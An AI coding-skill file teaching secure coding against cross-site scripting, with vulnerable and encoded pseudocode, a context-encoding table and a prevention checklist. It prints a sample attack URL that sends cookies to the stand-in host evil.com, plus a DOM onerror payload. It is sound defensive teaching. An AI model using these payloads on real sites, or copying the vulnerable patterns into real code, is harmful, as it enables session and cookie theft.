---
name: xss-anti-pattern
description: Security anti-pattern for Cross-Site Scripting vulnerabilities (CWE-79). Use when generating or reviewing code that renders HTML, handles user input in web pages, uses innerHTML/document.write, or builds dynamic web content. Covers Reflected, Stored, and DOM-based XSS. AI code has 86% XSS failure rate.
---

# Cross-Site Scripting (XSS) Anti-Pattern

**Severity:** Critical

## Risk

XSS has the **highest failure rate (86%)** in AI-generated code. AI models are 2.74x more likely to produce XSS-vulnerable code than human developers. XSS enables:

- Session hijacking via cookie theft
- Account takeover
- Credential theft
- Malware distribution
- Defacement

## BAD Pattern: Reflected XSS

```pseudocode
// VULNERABLE: User input directly echoed in response

FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // User input inserted directly into HTML
    html = "<h1>Search results for: " + query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

// Attack: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// Result: Script executes in victim's browser, stealing their session
```

## GOOD Pattern: HTML Encoding

```pseudocode
// SECURE: HTML-encode all user input before rendering

FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // HTML-encode user input
    safe_query = html_encode(query)

    html = "<h1>Search results for: " + safe_query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION html_encode(input):
    result = input
    result = result.replace("&", "&amp;")
    result = result.replace("<", "&lt;")
    result = result.replace(">", "&gt;")
    result = result.replace('"', "&quot;")
    result = result.replace("'", "&#x27;")
    RETURN result
END FUNCTION
```

## BAD Pattern: Stored XSS

```pseudocode
// VULNERABLE: Stored data rendered without encoding

FUNCTION display_comments(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    html = "<div class='comments'>"
    FOR comment IN comments:
        // Stored data rendered directly - attacker's script executes for all viewers
        html += "<p>" + comment.text + "</p>"
    END FOR
    html += "</div>"
    RETURN html
END FUNCTION
```

## GOOD Pattern: Encode Stored Data

```pseudocode
// SECURE: Encode all database-sourced content

FUNCTION display_comments(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    html = "<div class='comments'>"
    FOR comment IN comments:
        // All stored data is encoded
        html += "<p>" + html_encode(comment.text) + "</p>"
    END FOR
    html += "</div>"
    RETURN html
END FUNCTION

// Better: Use templating engine with auto-escaping
FUNCTION display_comments_template(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])
    // Jinja2, Handlebars, etc. auto-escape by default
    RETURN template.render("comments.html", {comments: comments})
END FUNCTION
```

## BAD Pattern: DOM-Based XSS

```pseudocode
// VULNERABLE: Dangerous DOM manipulation

FUNCTION display_welcome_message():
    params = parse_url_parameters(window.location.search)
    username = params.get("name")

    // innerHTML interprets content as HTML
    document.getElementById("welcome").innerHTML = "Welcome, " + username + "!"
END FUNCTION

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
```

## GOOD Pattern: Safe DOM Manipulation

```pseudocode
// SECURE: textContent treats input as text, not HTML

FUNCTION display_welcome_message():
    params = parse_url_parameters(window.location.search)
    username = params.get("name")

    // textContent - safe, treats input as text
    document.getElementById("welcome").textContent = "Welcome, " + username + "!"
END FUNCTION

// If HTML is absolutely needed, use sanitization library
FUNCTION set_sanitized_html(element, untrusted_html):
    clean_html = DOMPurify.sanitize(untrusted_html)
    element.innerHTML = clean_html
END FUNCTION
```

## Context-Specific Encoding

Different contexts require different encoding:

| Context | Encoding | Example |
|---------|----------|---------|
| HTML body | HTML entities | `&lt;script&gt;` |
| HTML attribute | HTML entities + quotes | `value="&quot;data&quot;"` |
| JavaScript | JS escape + `\x3c` | `var x = '\x3cscript\x3e';` |
| URL | URL encoding | `data%3Dvalue` |
| CSS | Allowlist or escape | `color: #fff;` |

## Detection

- Look for `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()`
- Search for string concatenation building HTML
- Check for template literals or f-strings in HTML responses
- Review any code that renders user input or database content

## Prevention Checklist

- [ ] HTML-encode all user input before rendering in HTML context
- [ ] Use `textContent` instead of `innerHTML` for user data
- [ ] Use templating engines with auto-escaping enabled
- [ ] Apply context-specific encoding (HTML, JS, URL, CSS)
- [ ] Implement Content-Security-Policy headers
- [ ] Use sanitization libraries (DOMPurify) when HTML is required

## Related Patterns

- [missing-security-headers](../missing-security-headers/) - CSP provides defense in depth
- [missing-input-validation](../missing-input-validation/) - Input validation as secondary defense

## References

- [OWASP Top 10 A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CAPEC-86: XSS Through HTTP Headers](https://capec.mitre.org/data/definitions/86.html)
- [CAPEC-591: Reflected XSS](https://capec.mitre.org/data/definitions/591.html)
- [CAPEC-592: Stored XSS](https://capec.mitre.org/data/definitions/592.html)
- Source: [sec-context](https://github.com/Arcanum-Sec/sec-context)
